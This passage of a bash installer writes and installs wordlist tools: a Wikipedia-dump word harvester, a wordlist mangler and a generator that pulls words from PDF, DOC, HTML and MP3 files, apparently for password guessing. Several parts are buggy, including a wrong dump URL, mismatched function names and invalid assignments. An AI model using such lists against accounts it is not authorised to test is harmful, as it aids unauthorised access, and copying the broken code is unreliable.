axel http://dumps.wikimedia.org/srwiki/latest/srwiki-latest-pages-articles.xml.bz2
bzip2 -d -c srwiki-latest-pages-articles.xml.bz2 >> srwiki.xml
rm -f srwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 srwiki.xml
rm -f srwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> srwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Sicilian 	(scn)
f_scn () {

axel http://dumps.wikimedia.org/skwiki/latest/skwiki-latest-pages-articles.xml.bz2
bzip2 -d -c skwiki-latest-pages-articles.xml.bz2 >> skwiki.xml
rm -f skwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 skwiki.xml
rm -f skwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> skwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Slovak (sk)
f_sk () {

axel http://dumps.wikimedia.org/skwiki/latest/skwiki-latest-pages-articles.xml.bz2
bzip2 -d -c skwiki-latest-pages-articles.xml.bz2 >> skwiki.xml
rm -f skwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 skwiki.xml
rm -f skwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> skwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Slovene (sl)
f_sl () {

axel http://dumps.wikimedia.org/slwiki/latest/slwiki-latest-pages-articles.xml.bz2
bzip2 -d -c slwiki-latest-pages-articles.xml.bz2 >> slwiki.xml
rm -f slwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 slwiki.xml
rm -f slwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> slwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Swedish (sv)
f_sv () {

axel http://dumps.wikimedia.org/svwiki/latest/svwiki-latest-pages-articles.xml.bz2
bzip2 -d -c svwiki-latest-pages-articles.xml.bz2 >> svwiki.xml
rm -f svwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 svwiki.xml
rm -f svwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> svwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Swahili (sw)
f_sw () {

axel http://dumps.wikimedia.org/swwiki/latest/swwiki-latest-pages-articles.xml.bz2
bzip2 -d -c swwiki-latest-pages-articles.xml.bz2 >> swwiki.xml
rm -f swwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 swwiki.xml
rm -f swwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> swwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Tarantino (roa-tara)
f_roa_tara () {

axel http://dumps.wikimedia.org/roa-tarawiki/latest/roa-tarawiki-latest-pages-articles.xml.bz2
bzip2 -d -c roa-tarawiki-latest-pages-articles.xml.bz2 >> roa-tarawiki.xml
rm -f roa-tarawiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 roa-tarawiki.xml
rm -f roa-tarawiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> roa-tarawiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Turkish (tr)
f_tr () {

axel http://dumps.wikimedia.org/trwiki/latest/trwiki-latest-pages-articles.xml.bz2
bzip2 -d -c trwiki-latest-pages-articles.xml.bz2 >> trwiki.xml
rm -f trwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 trwiki.xml
rm -f trwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> trwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Ukrainian (uk)
f_uk () {

axel http://dumps.wikimedia.org/ukwiki/latest/ukwiki-latest-pages-articles.xml.bz2
bzip2 -d -c ukwiki-latest-pages-articles.xml.bz2 >> ukwiki.xml
rm -f ukwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 ukwiki.xml
rm -f ukwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> ukwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Venetian 	(vec)
f_vec () {

axel http://dumps.wikimedia.org/vecwiki/latest/vecwiki-latest-pages-articles.xml.bz2
bzip2 -d -c vecwiki-latest-pages-articles.xml.bz2 >> vecwiki.xml
rm -f vecwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=50000 vecwiki.xml
rm -f vecwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> vecwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Vietnamese (vi)
f_vi () {

axel http://dumps.wikimedia.org/viwiki/latest/viwiki-latest-pages-articles.xml.bz2
bzip2 -d -c viwiki-latest-pages-articles.xml.bz2 >> viwiki.xml
rm -f viwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 viwiki.xml
rm -f viwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> viwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Volapük (vo)
f_vo () {

axel http://dumps.wikimedia.org/vowiki/latest/vowiki-latest-pages-articles.xml.bz2
bzip2 -d -c vowiki-latest-pages-articles.xml.bz2 >> vowiki.xml
rm -f vowiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 vowiki.xml
rm -f vowiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> vowiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Waray-Waray (war)
f_war () {

axel http://dumps.wikimedia.org/warwiki/latest/warwiki-latest-pages-articles.xml.bz2
bzip2 -d -c warwiki-latest-pages-articles.xml.bz2 >> warwiki.xml
rm -f warwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 warwiki.xml
rm -f warwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> warwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Yiddish (yi)
f_yi () {

axel http://dumps.wikimedia.org/yiwiki/latest/yiwiki-latest-pages-articles.xml.bz2
bzip2 -d -c yiwiki-latest-pages-articles.xml.bz2 >> yiwiki.xml
rm -f yiwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 yiwiki.xml
rm -f yiwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> yiwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

# Zulu (zu)
f_zu () {

axel http://dumps.wikimedia.org/zutwiki/latest/zutwiki-latest-pages-articles.xml.bz2
bzip2 -d -c zutwiki-latest-pages-articles.xml.bz2 >> zutwiki.xml
rm -f zutwiki-latest-pages-articles.xml.bz2

echo £+[*] Spliting ...£+
split --lines=500000 zutwiki.xml
rm -f zutwiki.xml

f_working

echo £+[*] Unifyng and Sorting ...£+
cat x*.txt | tr ' ' '\012' | sed -e '/^harrypotter/d' | sort -u >> zutwiki.txt
echo
echo £+##############################£+
echo

echo £+[*] Deleting x* ...£+
rm -f x*
echo
echo £+##############################£+
echo

}

echo -en £+Select the output dir (es: /home/user/wikiwordlist) : £+
read out

echo -en £+Select a temporal dir (es: /tmp) : £+
read -en tmp

cd harrypottertmp

# Downloading Wikies
f_download () {
f_af
f_ar
f_az
f_be
f_bg
f_ca
f_cs
f_da
f_de
f_el
f_eml
f_en
f_eo
f_es
f_et
f_eu
f_fa
f_fr
f_ga
f_gd
f_gl
f_got
f_he
f_hr
f_hu
f_hy
f_id
f_it
f_ja
f_ko
f_la
f_lb
f_lij
f_lmo
f_lt
f_ms
f_nap
f_no
f_nr
f_pl
f_pms
f_pt
f_ro
f_roa_tara
f_ru
f_scn
f_sk
f_sl
f_sq
f_sr
f_sv
f_sw
f_tr
f_uk
f_vec
f_vi
f_vo
f_war
f_yi
f_zh
f_zu

}

f_download

clear

cat *.txt | sort -u >> wikipedia.txt
wc -l *.txt

mv wikipedia.txt harrypotterout/wikipedia.txt

cd harrypotterHOME

echo £+Your wordlist is in harrypotterout£+

exit 0

" | sed -e 's/harrypotter/$/g' | sed -e 's/£+/"/g' >> wiki.sh

}

f_writing_wiki

ln -sf /opt/darkeffe/wiki.sh /usr/local/bin/wiki 1> /dev/null

cd $HOME

}

f_wiki

f_wordlist_ed () {

echo "  [*] Wordlist Editor"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f wordlisted.sh 1> /dev/null
touch wordlisted.sh 1> /dev/null

f_writing_wordlist_ed () {

echo "#!/bin/bash

clear

# Lowerise
f_low () {

clear

cat harrypotterfile | tr '[:upper:]' '[:lower:]' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Capitalise
f_capitalise () {

clear

cat harrypotterfile | tr '[:lower:]' '[:upper:]' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Capitalise The First Letter
f_cap_first () {

clear

cat harrypotterfile | sed -r 's/\b(.)/\U\1/g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Spaces to null
f_spaces_null () {

clear

cat harrypotterfile | sed -e 's/ //g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Spaces to -
f_spaces_dash () {

clear

cat harrypotterfile | sed -e 's/ /-/g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Spaces to _
f_spaces_underscore () {

clear

cat harrypotterfile | sed -e 's/ /_/g' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Spaces to return
f_spaces_return () {

clear

cat harrypotterfile | tr ' ' '\012' | sed -e 's/ *harrypotter//' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Add A word at the beginning of every line
f_add_begin () {

clear

echo -en £+Write the word that you want to add : £+
read wordadd

cat harrypotterfile | sed -e 's/^/'harrypotterwordadd'/' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Add A word at the end of every line
f_add_end () {

clear

echo -en £+Write the word that you want to add : £+
read wordadd

cat harrypotterfile | sed -e 's/harrypotter/'harrypotterwordadd'/' | sort -u >> harrypotterout/harrypotteroutname

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Numerise Beginning
f_num_begin () {

clear
echo -en £+Insert The first Number of the sequence : £+
read firstnum

clear
echo -en £+Insert The last Number of the sequence : £+
read lastnum

clear
echo -en £+Insert the value of the difference beetwen the first and £+
echo -en £+ the second number : £+
read pass

tmp = /abceviewvnhj
until [ -d harrypottertmp ]; do

	clear
	echo -en £+Select the tmp dir (es: /tmp) : £+
	read tmp

	if [ ! -d harrypottertmp ]; then

		echo
		echo £+The directory do not exist !!!!!!!!!!£+
		sleep 2

	fi

done

clear

until [ harrypotterfirstnum -gt harrypotterlastnum ]; do

	echo harrypotterfirstnum

	cat harrypotterfile | sed -e 's/^/'harrypotterfirstnum'/' >> harrypottertmp/harrypotterfirstnum.tmp

	firstnum=harrypotter[ harrypotterfirstnum + harrypotterpass ]

done

clear

echo £+[*] Sorting Wordlist ...£+
cat harrypottertmp/harrypotteroutname.tmp | sort -u >> harrypotterout/harrypotteroutname

clear

( rm -f harrypottertmp/harrypotteroutname.tmp ) &

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}

# Numerise End
f_num_end () {

clear
echo -en £+Insert The first Number of the sequence : £+
read firstnum

clear
echo -en £+Insert The last Number of the sequence : £+
read lastnum

clear
echo -en £+Insert the value of the difference beetwen the first and £+
echo -en £+ the second number : £+
read pass

tmp = /90e12840948248
until [ -d harrypottertmp ]; do

	clear
	echo -en £+Select the tmp dir (es: /tmp) : £+
	read tmp

	if [ ! -d harrypottertmp ]; then

		echo
		echo £+The directory do not exist !!!!!!!!!!£+
		sleep 2

	fi

done

clear

until [ harrypotterfirstnum -gt harrypotterlastnum ]; do

	echo harrypotterfirstnum

	cat harrypotterfile | sed -e 's/harrypotter/'harrypotterfirstnum'/' >> harrypottertmp/harrypotteroutname.tmp

	firstnum=harrypotter[ harrypotterfirstnum + harrypotterpass ]

done

clear

echo £+[*] Sorting Wordlist ...£+
cat harrypottertmp/harrypotteroutname.tmp | sort -u >> harrypotterout/harrypotteroutname

clear

( rm -f harrypottertmp/harrypotteroutname.tmp ) &

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0


}

# All
f_all () {

tmp=/pppppppppppppppppppp

until [ -d harrypottertmp ]; do

	clear
	echo -en £+Select the tmp dir (es: /tmp) : £+
	read tmp

	if [ ! -d harrypottertmp ]; then

		echo
		echo £+The directory d not exist !!!!!!!!!!£+
		sleep 2

	fi

done

clear

echo £+[*] Lowerising Wordlist ... £+
cat harrypotterfile | tr '[:upper:]' '[:lower:]' | sed -e 's/ *harrypotter//' >> harrypottertmp/lower.txt
echo

echo £+[*] Capitalising Wordlist ... £+
cat harrypotterfile | tr '[:lower:]' '[:upper:]' | sed -e 's/ *harrypotter//' >> harrypottertmp/capitalised.txt
echo

echo £+[*] Capitalising The First Letter ... £+
cat harrypotterfile | sed -r 's/\b(.)/\U\1/g' | sed -e 's/ *harrypotter//' >> harrypottertmp/firscapitalised.txt
echo

echo £+[*] Merging the Wordlists ... £+
cat harrypottertmp/lower.txt harrypottertmp/capitalised.txt harrypottertmp/firscapitalised.txt | sort -u >> harrypottertmp/wordlistedit1.txt
echo

echo £+[*] Spaces To Null ... £+
cat harrypottertmp/wordlistedit1.txt | sed -e 's/ //g'>> harrypottertmp/wordlistedit2.txt
echo

echo £+[*] Spaces to Dash (-) ... £+
cat harrypottertmp/wordlistedit1.txt | sed -e 's/ /-/g' >> harrypottertmp/wordlistedit3.txt
echo

echo £+[*] Spaces to Underscore (_)... £+
cat harrypottertmp/wordlistedit1.txt | sed -e 's/ /_/g' >> harrypottertmp/wordlistedit4.txt
echo

echo £+[*] Spaces to Return ... £+
cat harrypottertmp/wordlistedit1.txt | tr ' ' '\012' >> harrypottertmp/wordlistedit5.txt
echo

echo £+[*] Creating harrypotteroutname ... £+
cat harrypottertmp/wordlistedit1.txt harrypottertmp/wordlistedit2.txt harrypottertmp/wordlistedit3.txt harrypottertmp/wordlistedit4.txt harrypottertmp/wordlistedit5.txt | sort -u >> harrypotterout/harrypotteroutname
echo

echo £+[*] Deleting tmp files ... £+
rm -f harrypottertmp/lower.txt
rm -f harrypottertmp/capitalised.txt
rm -f harrypottertmp/firstcapitalised.txt
rm -f harrypottertmp/wordlistedit1.txt
rm -f harrypottertmp/wordlistedit2.txt
rm -f harrypottertmp/wordlistedit3.txt
rm -f harrypottertmp/wordlistedit4.txt
rm -f harrypottertmp/wordlistedit5.txt
echo

clear

echo £+Your Wordlist is in harrypotterout/harrypotteroutname£+

exit 0

}


# Menu
f_menu () {

choice=90
low=1
cap=2
capfirst=3
spacenull=4
spacedash=5
spaceunderscore=6
spacereturn=7
wordbegin=8
wordend=9
numbegin=10
numend=11
all=12

until [ harrypotterchoice == harrypotterlow ] || [ harrypotterchoice == harrypottercap ] || [ harrypotterchoice == harrypottercapfirst ] || [ harrypotterchoice == harrypotterspacenull ] || [ harrypotterchoice == harrypotterspacedash ] || [ harrypotterchoice == harrypotterspaceunderscore ] || [ harrypotterchoice == harrypotterspacereturn ] || [ harrypotterchoice == harrypotterwordbegin ] || [ harrypotterchoice == harrypotterwordend ] || [ harrypotterchoice == harrypotternumbegin ] || [ harrypotterchoice == harrypotternumend ] || [ harrypotterchoice == harrypotterall ]; do

clear

echo £+Select an Options :

1) All letters to lower
2) All letter to Capital
3) First letter to Capital
4) Nullify Spaces
5) Spaces to Dash (-)
6) Spaces to Underscore (_)
7) Spaces to Return
8) Add a word of your choosing at the beginning of every line
9) Add a word of your choosing at the end of every line
10) Numerise the beginning of every line
11) Numerise the end of every line
12) All: Take a wordlist, capitalise and lowerise it, sort and transform
        spaces to null, dash, underscore and return, and merge it all

£+

echo -en £+Selection : £+
read choice

done

file=/bin/0

until [ -e harrypotterfile ]; do

	clear
	echo -en £+Select the input file path (es: /home/user/wordlist.txt) : £+
	read file

	if [ ! -e harrypotterfile ]; then

		echo
		echo £+The file do not exist !!!!!!!£+
		sleep 2

	fi

done

out=/ooooooooooooooooooooooooooo

until [ -d harrypotterout ]; do

	clear
	echo -en £+Select the output dir (es: /home/user) : £+
	read out

	if [ ! -d harrypotterout ]; then

		echo
		echo £+The directory do not exist !!!!!!!£+
		sleep 2

	fi

done

until [ ! -e harrypotterout/harrypotteroutname ]; do

	clear
	echo -en £+Select the output file name (es: wordlistedited.txt) : £+
	read outname

	if [ -e harrypotterout/harrypotteroutname ]; then

		echo
		echo £+The file already exist !!!!!!!£+
		sleep 2

	fi

done

if [ harrypotterchoice == harrypotterlow ]; then
	f_low
fi

if [ harrypotterchoice == harrypottercap ]; then
	f_capitalised
fi

if [ harrypotterchoice == harrypottercapfirst ]; then
	f_cap_first
fi

if [ harrypotterchoice == harrypotterspacenull ] ; then
	f_spaces_null
fi

if [ harrypotterchoice == harrypotterspacedash ]; then
	f_space_dash
fi

if [ harrypotterchoice == harrypotterspaceunderscore ]; then
	f_spacess_underscore
fi

if [ harrypotterchoice == harrypotterspacereturn ]; then
	f_spaces_return
fi

if [ harrypotterchoice == harrypotterwordbegin ]; then
	f_add_begin
fi

if [ harrypotterchoice == harrypotterwordend ]; then
	f_add_end
fi

if [ harrypotterchoice == harrypotternumbegin ]; then
	f_num_begin
fi

if [ harrypotterchoice == harrypotternumend ]; then
	f_num_end
fi

if [ harrypotterchoice == harrypotterall ]; then
	f_all
fi

}

f_menu


" | sed -e 's/harrypotter/$/g' | sed -e 's/£+/"/g' >> wordlisted.sh

}

f_writing_wordlist_ed

ln -sf /opt/darkeffe/wordlisted.sh /usr/local/bin/wordlisted 1> /dev/null

cd $HOME

}

f_wordlist_ed

f_wordlist_gen () {

echo "  [*] Worldist Generator"

cd /opt 1> /dev/null
mkdir -p darkeffe 1> /dev/null
cd darkeffe 1> /dev/null

rm -f wordlistgen.sh 1> /dev/null
touch wordlistgen.sh 1> /dev/null

f_writing_wordlist_gen () {

echo "#!/bin/bash

# PdfToText
f_pdf_to_text () {

clear

echo £+::: Pdf to text :::£+
echo
echo -en £+Select the dir where PDFs are contained (es: /home/user/pdf) : £+
read dir
echo
echo -en £+Select the tmp dir (es: /tmp) : £+
read tmp
echo
echo -en £+Select the output dir (es: /home/user/wordlist) : £+
read out

clear

echo £+::: Pdf to text :::£+

echo
echo £+[*] Trasforming every PDF to TXT£+

cd harrypotterdir

n=1

FILE=£+/harrypottertmp/count.txt£+
ls *.pdf > harrypotterFILE

t=harrypotter(grep [^*harrypotter] harrypotterFILE -c)

for i in *.pdf; do
	if [ -e £+harrypotteri£+ ]; then
		file=harrypotter( basename £+harrypotteri£+ .pdf )
		echo harrypottern / harrypottert
		pdftotext £+harrypotteri£+ £+harrypottertmp/harrypotterfile.txt£+ 2> /dev/null
		n=harrypotter[ harrypottern + 1 ]
	fi
done

rm -f harrypotterFILE

echo
echo £+[*] Merging All TXT£+
cat *.txt | sed -e 's/[^a-zA-Z]/ /g' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/ààà/d' | sed -e '/èèè/d' | sed -e '/ììì/d' | sed -e '/òòò/d' | sed -e '/ùùù/d' | sed -e '/£££/d' | sed -e '/&&&/d' | sed -e '/ççç/d' | sed -e '/§§§/d' | sed -e '/harrypotterharrypotterharrypotter/d' | tr ' ' '\012' | tr '[:upper:]' '[:lower:]' | sed -e '/^harrypotter/d' | sort -u >> harrypotterout/pdf.txt 2> /dev/null

cd harrypottertmp
rm -f *.txt
cd harrypotterHOME

echo
echo £+Done!£+

exit 0

}

# Catdoc
f_catdoc () {

clear

echo £+::: CatDoc:::£+
echo
echo -en £+Select the dir where DOCs are contained (es: /home/user/doc) : £+
read dir
echo
echo -en £+Select the tmp dir (es: /tmp) : £+
read tmp
echo
echo -en £+Select the output dir (es: /home/user/wordlist) : £+
read out

clear

echo £+::: CatDoc :::£+

echo
echo £+[*] Trasforming every DOC to TXT£+

cd harrypotterdir

n=1

FILE=£+/harrypottertmp/count.txt£+
ls *.doc > harrypotterFILE

t=harrypotter(grep [^*harrypotter] harrypotterFILE -c)

for i in *.doc; do
	if [ -e £+harrypotteri£+ ]; then
		file=harrypotter( basename £+harrypotteri£+ .doc )
		echo harrypottern / harrypottert
		catdoc -a  £+harrypotteri£+ >> £+harrypottertmp/harrypotterfile.txt£+ 2> /dev/null
		n=harrypotter[ harrypottern + 1 ]
	fi
done

rm -f harrypotterFILE

echo
echo £+[*] Merging All TXT£+

cat *.txt | sed -e 's/[^a-zA-Z]/ /g' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/ààà/d' | sed -e '/èèè/d' | sed -e '/ììì/d' | sed -e '/òòò/d' | sed -e '/ùùù/d' | sed -e '/£££/d' | sed -e '/&&&/d' | sed -e '/ççç/d' | sed -e '/§§§/d' | sed -e '/harrypotterharrypotterharrypotter/d' | tr ' ' '\012' | tr '[:upper:]' '[:lower:]' | sed -e '/^harrypotter/d' | sort -u >> harrypotterout/doc.txt 2> /dev/null

cd harrypottertmp
rm -f *.txt
cd harrypotterHOME

echo
echo £+Done!£+

exit 0

}

# Html2Text
f_html_to_text () {

clear

echo £+::: Html to text :::£+
echo
echo -en £+Select the dir where HTMLs are contained (es: /home/user/html) : £+
read dir
echo
echo -en £+Select the tmp dir (es: /tmp) : £+
read tmp
echo
echo -en £+Select the output dir (es: /home/user/wordlist) : £+
read out

clear

echo £+::: Html to text :::£+

echo
echo £+[*] Trasforming every HTML to TXT£+

cd harrypotterdir

n=1

FILE=£+/harrypottertmp/count.txt£+
ls *.html > harrypotterFILE

t=harrypotter(grep [^*harrypotter] harrypotterFILE -c)

for i in *.html; do
	if [ -e £+harrypotteri£+ ]; then
		file=harrypotter( basename £+harrypotteri£+ .html )
		echo harrypottern / harrypottert
		cat £+harrypotteri£+ | html2text >> £+harrypottertmp/harrypotterfile.txt£+ 2> /dev/null
		n=harrypotter[ harrypottern + 1 ]
	fi
done

rm -f harrypotterFILE

echo
echo £+[*] Merging All TXT£+

cat *.txt | sed -e 's/[^a-zA-Z]/ /g' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/ààà/d' | sed -e '/èèè/d' | sed -e '/ììì/d' | sed -e '/òòò/d' | sed -e '/ùùù/d' | sed -e '/£££/d' | sed -e '/&&&/d' | sed -e '/ççç/d' | sed -e '/§§§/d' | sed -e '/harrypotterharrypotterharrypotter/d' | tr ' ' '\012' | tr '[:upper:]' '[:lower:]' | sed -e '/^harrypotter/d' | sort -u >> harrypotterout/html.txt 2> /dev/null

cd harrypottertmp
rm -f *.txt
cd harrypotterHOME

echo
echo £+Done!£+

exit 0

}

# Id3v2
f_id3v2 () {

clear

echo £+::: Id3v2 :::£+
echo
echo -en £+Select the dir where MP3s are contained (es: /home/user/music) : £+
read dir
echo
echo -en £+Select the tmp dir (es: /tmp) : £+
read tmp
echo
echo -en £+Select the output dir (es: /home/user/wordlist) : £+
read out

clear

echo £+::: Id3v2 :::£+

echo
echo £+[*] Estracting The MP3 tags£+

cd harrypotterdir

n=1

FILE=£+/harrypottertmp/count.txt£+
ls *.mp3 > harrypotterFILE

t=harrypotter(grep [^*harrypotter] harrypotterFILE -c)

for i in *.mp3; do
	if [ -e £+harrypotteri£+ ]; then
		file=harrypotter( basename £+harrypotteri£+ .mp3 )
		echo harrypottern / harrypottert
		id3v2 -l £+harrypotteri£+ >> £+harrypottertmp/harrypotterfile.txt£+ 2> /dev/null
		n=harrypotter[ harrypottern + 1 ]
	fi
done

rm -f harrypotterFILE

echo
echo £+[*] Merging All TXT£+

cat *.txt | sed -e 's/[^a-zA-Z]/ /g' | sed -e '/aaa/d' | sed -e '/bbb/d' | sed -e '/ccc/d' | sed -e '/ddd/d' | sed -e '/eee/d' | sed -e '/fff/d' | sed -e '/ggg/d' | sed -e '/hhh/d' | sed -e '/iii/d' | sed -e '/jjj/d' | sed -e '/kkk/d' | sed -e '/lll/d' | sed -e '/mmm/d' | sed -e '/nnn/d' | sed -e '/ooo/d' | sed -e '/ppp/d' | sed -e '/qqq/d' | sed -e '/rrr/d' | sed -e '/sss/d' | sed -e '/ttt/d' | sed -e '/uuu/d' | sed -e '/vvv/d' | sed -e '/www/d' | sed -e '/xxx/d' | sed -e '/yyy/d' | sed -e '/zzz/d' | sed -e '/ààà/d' | sed -e '/èèè/d' | sed -e '/ììì/d' | sed -e '/òòò/d' | sed -e '/ùùù/d' | sed -e '/£££/d' | sed -e '/&&&/d' | sed -e '/ççç/d' | sed -e '/§§§/d' | sed -e '/harrypotterharrypotterharrypotter/d' | tr ' ' '\012' | tr '[:upper:]' '[:lower:]' | sed -e '/^harrypotter/d' | sort -u >> harrypotterout/music.txt 2> /dev/null

cd harrypottertmp
rm -f *.txt
cd harrypotterHOME

echo
echo £+Done!£+

exit 0

}



# Menu
f_menu () {

clear

while :

do

£+======================================================

This Script Lets You Transform Your File to Wordlist

=======================================================
Dependecies:

PdfToText
Catdoc
Html2text
id32v

=======================================================

1) Create a Wordlist from your PDF Files
2) Create a Wordlist from your DOC files
3) Create a Wordlist from your HTML files
